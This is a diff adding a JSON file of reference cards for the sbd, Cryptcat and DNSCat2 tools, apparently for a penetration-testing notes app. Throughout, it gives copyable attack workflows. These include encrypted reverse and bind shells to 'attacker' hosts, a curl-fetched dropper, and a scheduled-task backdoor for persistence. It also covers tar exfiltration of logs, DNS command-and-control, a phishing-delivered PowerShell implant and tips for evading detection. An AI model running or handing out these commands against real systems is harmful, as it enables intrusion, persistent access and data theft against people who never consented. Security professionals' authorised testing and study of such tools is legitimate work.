@@ -1,0 +1,672 @@
+[
+  {
+    "id": "sbd",
+    "name": "sbd",
+    "summary": "sbd (Secure Backdoor) is an encrypted netcat alternative for staged shells and pivoting when simple TCP listeners are blocked.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install from repositories",
+        "steps": [
+          {
+            "detail": "sudo apt update",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y sbd",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Generate static binaries for dropper use",
+        "steps": [
+          {
+            "detail": "sudo apt install -y sbd mingw-w64",
+            "copyable": true
+          },
+          {
+            "detail": "sbd -h",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Source build",
+        "summary": "Compile customized version",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/portcullislabs/sbd.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd sbd && make linux",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "TLS listener",
+        "command": "sbd -l -p 4443 -k supersecret",
+        "notes": [
+          "Creates encrypted bind shell"
+        ]
+      },
+      {
+        "description": "Connect to listener",
+        "command": "sbd attacker.example.com 4443 -k supersecret",
+        "notes": [
+          "AES-128 encrypts traffic"
+        ]
+      },
+      {
+        "description": "Command execution",
+        "command": "sbd -l -p 8081 -k key -e /bin/bash",
+        "notes": [
+          "-e executes program upon connect"
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l",
+        "description": "Listen (server) mode"
+      },
+      {
+        "flag": "-p <port>",
+        "description": "TCP port"
+      },
+      {
+        "flag": "-k <pass>",
+        "description": "Shared key for encryption"
+      },
+      {
+        "flag": "-e <cmd>",
+        "description": "Execute program"
+      },
+      {
+        "flag": "-v",
+        "description": "Verbose output"
+      }
+    ],
+    "operational_tips": [
+      "Share keys over out-of-band channels; sbd does not implement PKI.",
+      "Use -c to enable compression when tunneling over high-latency links.",
+      "Drop binaries in /tmp and wipe after session to avoid detection.",
+      "Run through socat/proxychains for additional obfuscation."
+    ],
+    "step_sequences": [
+      {
+        "title": "Reverse shell fallback",
+        "steps": [
+          {
+            "title": "Prepare listener",
+            "details": "Launch encrypted listener on operator box.",
+            "command": "sbd -l -p 3444 -k wintermute -e /bin/bash"
+          },
+          {
+            "title": "Deploy payload",
+            "details": "Upload sbd binary to target and execute.",
+            "command": "./sbd attacker 3444 -k wintermute -e /bin/bash"
+          },
+          {
+            "title": "Stabilize",
+            "details": "Upgrade to PTY and log session.",
+            "command": "script -qc /bin/bash sbd-session.log"
+          }
+        ]
+      },
+      {
+        "title": "Pivoting over TLS",
+        "steps": [
+          {
+            "title": "Forward internal ports",
+            "details": "Chain sbd with ssh/proxychains.",
+            "command": "sbd -l -p 5555 -k pivot --exec 'ssh -N -L 3389:target:3389 jump'"
+          },
+          {
+            "title": "Connect from foothold",
+            "details": "Use shared secret to open tunnel.",
+            "command": "sbd operator 5555 -k pivot"
+          },
+          {
+            "title": "Document",
+            "details": "Record commands + timeline in PT Journal.",
+            "command": "# PT Journal \u2192 Notes \u2192 Pivot details"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Foothold \u2192 sbd pivot \u2192 escalation",
+        "stages": [
+          {
+            "label": "Deploy",
+            "description": "Drop sbd binary via existing shell.",
+            "command": "curl http://attacker/sbd -o /tmp/sbd && chmod +x /tmp/sbd"
+          },
+          {
+            "label": "Tunnel",
+            "description": "Establish encrypted reverse shell.",
+            "command": "/tmp/sbd attacker 443 -k scope -e /bin/bash"
+          },
+          {
+            "label": "Escalate",
+            "description": "Use stable channel to run linpeas/winpeas.",
+            "command": "./linpeas.sh | tee peas.log"
+          },
+          {
+            "label": "Cleanup",
+            "description": "Remove binaries and logs when engagement concludes.",
+            "command": "rm -f /tmp/sbd"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Cipher negotiation failed",
+        "meaning": "Keys mismatch\u2014double-check passphrase.",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Connection reset",
+        "meaning": "Likely security tool killed the session; rotate port or wrap in HTTPS.",
+        "severity": "High"
+      },
+      {
+        "indicator": "Session closed",
+        "meaning": "Peer exited; confirm cleanup succeeded.",
+        "severity": "Info"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Windows payload",
+        "command": "x86_64-w64-mingw32-gcc sbd.c -o sbd.exe -lws2_32",
+        "scenario": "Compile native Windows client.",
+        "notes": [
+          "Strip symbols with upx -9 sbd.exe"
+        ]
+      },
+      {
+        "title": "Chained encryption",
+        "command": "openssl s_client -quiet -connect attacker:443 | sbd 127.0.0.1 4444 -e /bin/sh",
+        "scenario": "Hide sbd inside TLS-wrapped tunnel.",
+        "notes": [
+          "Useful when outbound connections inspected."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Project page",
+        "url": "https://github.com/portcullislabs/sbd",
+        "description": "Source and documentation."
+      },
+      {
+        "label": "Encrypted netcat cheat sheet",
+        "url": "https://highon.coffee/blog/reverse-shell-cheat-sheet/",
+        "description": "Compares sbd with socat/ncat."
+      },
+      {
+        "label": "Secure pivoting guide",
+        "url": "https://ired.team/offensive-security-experiments/offensive-security-cheetsheets",
+        "description": "Pivot techniques referencing sbd."
+      }
+    ]
+  },
+  {
+    "id": "cryptcat",
+    "name": "Cryptcat",
+    "summary": "Cryptcat is a drop-in encrypted replacement for netcat supporting Twofish/AES, UDP mode, and IPv6 for covert channels.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Install from repositories",
+        "steps": [
+          {
+            "detail": "sudo apt update",
+            "copyable": true
+          },
+          {
+            "detail": "sudo apt install -y cryptcat",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Use preinstalled binary",
+        "steps": [
+          {
+            "detail": "which cryptcat",
+            "copyable": true
+          },
+          {
+            "detail": "cryptcat -h",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Windows (Cygwin)",
+        "summary": "Drop compiled cryptcat.exe",
+        "steps": [
+          {
+            "detail": "curl -O https://sourceforge.net/projects/cryptcat/files/latest/download",
+            "copyable": true
+          },
+          {
+            "detail": "certutil -hashfile cryptcat.exe SHA256",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Encrypted bind shell",
+        "command": "cryptcat -l -p 9001 -k winter -e /bin/sh",
+        "notes": [
+          "Twofish encryption protects payloads."
+        ]
+      },
+      {
+        "description": "UDP callback",
+        "command": "cryptcat attacker 9001 -k winter -u",
+        "notes": [
+          "Useful where TCP inspection is strict."
+        ]
+      },
+      {
+        "description": "File transfer",
+        "command": "cryptcat -l -p 2222 -k foo > file.bin",
+        "notes": [
+          "Send side: `cryptcat host 2222 -k foo < file.bin`."
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l",
+        "description": "Listen mode"
+      },
+      {
+        "flag": "-p",
+        "description": "Port"
+      },
+      {
+        "flag": "-k",
+        "description": "Shared secret"
+      },
+      {
+        "flag": "-e",
+        "description": "Execute command"
+      },
+      {
+        "flag": "-u",
+        "description": "UDP mode"
+      }
+    ],
+    "operational_tips": [
+      "Cryptcat uses Twofish in CFB\u2014share key carefully and rotate often.",
+      "Combine with socat/ssh to blend into existing tunnels.",
+      "On Windows, use -c to disable console buffering and avoid truncated output.",
+      "Record transcripts (script/tmux logging) for audit trails."
+    ],
+    "step_sequences": [
+      {
+        "title": "Windows persistence helper",
+        "steps": [
+          {
+            "title": "Upload binary",
+            "details": "Drop cryptcat.exe into C:\\Windows\\Temp.",
+            "command": "copy cryptcat.exe C:\\Windows\\Temp\\cc.exe"
+          },
+          {
+            "title": "Install service",
+            "details": "Create scheduled task to launch at reboot.",
+            "command": "schtasks /Create /SC ONLOGON /TN ccbackdoor /TR 'C:\\Windows\\Temp\\cc.exe attacker 443 -k scope -e cmd.exe'"
+          },
+          {
+            "title": "Monitor",
+            "details": "Keep handler running with tmux logging.",
+            "command": "tmux pipe-pane -o 'cat >> cryptcat.log'"
+          }
+        ]
+      },
+      {
+        "title": "Covert file exfil",
+        "steps": [
+          {
+            "title": "Start listener",
+            "details": "Listen with key + compression.",
+            "command": "cryptcat -l -p 7777 -k archive -z > archive.tar.gz"
+          },
+          {
+            "title": "Send data",
+            "details": "Pipe tarball over cryptcat.",
+            "command": "tar czf - /var/log | cryptcat operator 7777 -k archive"
+          },
+          {
+            "title": "Verify integrity",
+            "details": "Hash files and attach to PT Journal evidence.",
+            "command": "sha256sum archive.tar.gz"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Dropper \u2192 Encrypted channel \u2192 Cleanup",
+        "stages": [
+          {
+            "label": "Deploy",
+            "description": "Copy cryptcat to target host.",
+            "command": "scp cryptcat root@victim:/tmp/cc"
+          },
+          {
+            "label": "Connect",
+            "description": "Start/receive encrypted shell.",
+            "command": "cryptcat -l -p 6000 -k client -e /bin/bash"
+          },
+          {
+            "label": "Operate",
+            "description": "Conduct actions-on-objective via stable channel.",
+            "command": "# run privesc scripts, data staging"
+          },
+          {
+            "label": "Destroy",
+            "description": "Delete binaries and rotate keys.",
+            "command": "rm -f /tmp/cc"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "cryptcat: bad key",
+        "meaning": "Shared secret mismatch or truncated entry.",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Connection timed out",
+        "meaning": "Firewall killed idle session; enable keepalive (send heartbeats).",
+        "severity": "Info"
+      },
+      {
+        "indicator": "Buffer overflow warning",
+        "meaning": "Transferring large file over UDP can drop data\u2014switch to TCP.",
+        "severity": "High"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "IPv6 channels",
+        "command": "cryptcat -l -p 9001 -k hex -6",
+        "scenario": "Bypass IPv4 ACLs by tunneling over IPv6.",
+        "notes": [
+          "Verify dual-stack connectivity first."
+        ]
+      },
+      {
+        "title": "Proxy integration",
+        "command": "proxychains cryptcat target 443 -k stealth",
+        "scenario": "Blend cryptcat within TOR/SOCKS for additional anonymity.",
+        "notes": [
+          "Set proxy_dns in proxychains.conf"
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Cryptcat Sourceforge",
+        "url": "https://cryptcat.sourceforge.net/",
+        "description": "Official downloads and documentation."
+      },
+      {
+        "label": "Encrypted shells overview",
+        "url": "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet",
+        "description": "Comparison between nc, sbd, ncat, cryptcat."
+      },
+      {
+        "label": "Blue team detections",
+        "url": "https://www.sans.org/blog/detecting-encrypted-shells/",
+        "description": "Help articulate detection gaps in reports."
+      }
+    ]
+  },
+  {
+    "id": "dnscat2",
+    "name": "DNSCat2",
+    "summary": "DNSCat2 provides a command-and-control channel that tunnels shells, file transfers, and port forwarding through DNS queries.",
+    "installation_guides": [
+      {
+        "platform": "Server (Ruby)",
+        "summary": "Set up dnscat2 server with Ruby and Bundler",
+        "steps": [
+          {
+            "detail": "sudo apt install -y ruby bundler",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/iagox86/dnscat2.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd dnscat2/server && bundle install",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Client (Linux)",
+        "summary": "Compile C client",
+        "steps": [
+          {
+            "detail": "cd dnscat2/client",
+            "copyable": true
+          },
+          {
+            "detail": "make",
+            "copyable": true
+          },
+          {
+            "detail": "./dnscat --help",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Windows PowerShell client",
+        "summary": "Use prebuilt scripts on compromised hosts",
+        "steps": [
+          {
+            "detail": "powershell -ExecutionPolicy Bypass -File dnscat2.ps1",
+            "copyable": true
+          },
+          {
+            "detail": "Invoke-Dnscat2 -Domain c2.example.com",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Start server",
+        "command": "ruby dnscat2.rb --dns domain=c2.example.com",
+        "notes": [
+          "Point NS records of c2.example.com to server IP."
+        ]
+      },
+      {
+        "description": "Launch client",
+        "command": "./dnscat --dns domain=c2.example.com",
+        "notes": [
+          "Creates interactive session in server console."
+        ]
+      },
+      {
+        "description": "Run PowerShell implant",
+        "command": "Invoke-Dnscat2 -Domain c2.example.com -Command 'launch calc'",
+        "notes": [
+          "Use when only Windows access available."
+        ]
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--dns server=x.x.x.x",
+        "description": "Specify DNS server"
+      },
+      {
+        "flag": "--dns domain=example.com",
+        "description": "Authoritative domain used for C2"
+      },
+      {
+        "flag": "--secret <key>",
+        "description": "Shared secret for session"
+      },
+      {
+        "flag": "--exec <cmd>",
+        "description": "Execute command on session start"
+      }
+    ],
+    "operational_tips": [
+      "Use short TTLs and dedicated domain to avoid interfering with real production records.",
+      "Rotate secrets frequently; dnscat2 sessions are not end-to-end encrypted by default.",
+      "Throttle clients with --delay to mimic legitimate DNS chatter.",
+      "Document any DNS changes (NS records, zones) in PT Journal for rollback."
+    ],
+    "step_sequences": [
+      {
+        "title": "Deploying DNS C2",
+        "steps": [
+          {
+            "title": "Configure DNS",
+            "details": "Delegate c2.example.com to server.",
+            "command": "nsupdate <<'EON'\nupdate add c2.example.com 3600 NS ns1.attacker.com\nsend\nEON"
+          },
+          {
+            "title": "Start server",
+            "details": "Run dnscat2 with logging.",
+            "command": "ruby dnscat2.rb --dns domain=c2.example.com --secret blue -l logs/session.log"
+          },
+          {
+            "title": "Launch client",
+            "details": "Execute binary/script on compromised host.",
+            "command": "./dnscat --dns domain=c2.example.com --secret blue"
+          }
+        ]
+      },
+      {
+        "title": "File transfer via DNS",
+        "steps": [
+          {
+            "title": "Open session",
+            "details": "Use server console to interact with channel.",
+            "command": "session -i 1"
+          },
+          {
+            "title": "Start file mode",
+            "details": "Switch to file transfer.",
+            "command": "download /etc/passwd"
+          },
+          {
+            "title": "Verify",
+            "details": "Ensure hash matches and attach to evidence.",
+            "command": "sha256sum downloads/passwd"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Phish \u2192 DNS beacon \u2192 Control",
+        "stages": [
+          {
+            "label": "Deliver",
+            "description": "Send phishing payload that runs dnscat2 client.",
+            "command": "powershell -Command Invoke-Dnscat2"
+          },
+          {
+            "label": "Beacon",
+            "description": "DNS traffic reaches authoritative server and registers session.",
+            "command": "session -l"
+          },
+          {
+            "label": "Task",
+            "description": "Run shell, port forward, or file transfer.",
+            "command": "shell --id 2"
+          },
+          {
+            "label": "Cleanup",
+            "description": "Kill sessions and remove NS delegation post-engagement.",
+            "command": "session -k 2"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[session 1] opened",
+        "meaning": "Client successfully connected.",
+        "severity": "Info"
+      },
+      {
+        "indicator": "AUTH ERROR",
+        "meaning": "Secret mismatch or replay attempt detected.",
+        "severity": "High"
+      },
+      {
+        "indicator": "Too many pending packets",
+        "meaning": "Channel saturated\u2014tune --maxlength or deploy additional domains.",
+        "severity": "Medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "SOCKS proxy over DNS",
+        "command": "session -i 1; socks 1080",
+        "scenario": "Route traffic from operator machine through compromised host via DNS tunnel.",
+        "notes": [
+          "Combine with proxychains for tooling reuse."
+        ]
+      },
+      {
+        "title": "Staging multiple domains",
+        "command": "ruby dnscat2.rb --dns domain=ops.example --dns domain=backup.example",
+        "scenario": "Provide redundancy in case one domain is blocked.",
+        "notes": [
+          "Keep TTLs low for fast failover."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Project repo",
+        "url": "https://github.com/iagox86/dnscat2",
+        "description": "Source, documentation, scripts."
+      },
+      {
+        "label": "Subdomain delegation primer",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns",
+        "description": "Guidance on DNS records for tunneling."
+      },
+      {
+        "label": "Blue team detection",
+        "url": "https://www.sans.org/blog/detecting-dns-tunneling/",
+        "description": "Use in reporting to explain mitigations."
+      }
+    ]
+  }
+]
